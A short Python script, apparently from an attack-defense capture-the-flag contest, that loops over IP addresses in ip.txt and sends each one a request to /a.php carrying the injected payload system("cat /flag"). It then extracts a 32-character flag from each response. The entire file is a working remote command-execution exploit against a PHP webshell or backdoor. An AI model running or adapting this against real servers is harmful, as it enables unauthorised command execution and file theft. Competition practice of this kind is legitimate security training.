import requests
import re
f = open('ip.txt','r')
for i in f.readlines():

    url = 'http://'+ i.strip()
    url_path = '/a.php?c=system("cat /flag");'
    r = requests.get(url+url_path)
    result = re.search('[a-z0-9]{32}', r.text)
    if r.status_code==200:
        print(url,result.group())
    else:
        print(url,"There is no flag here")
f.close()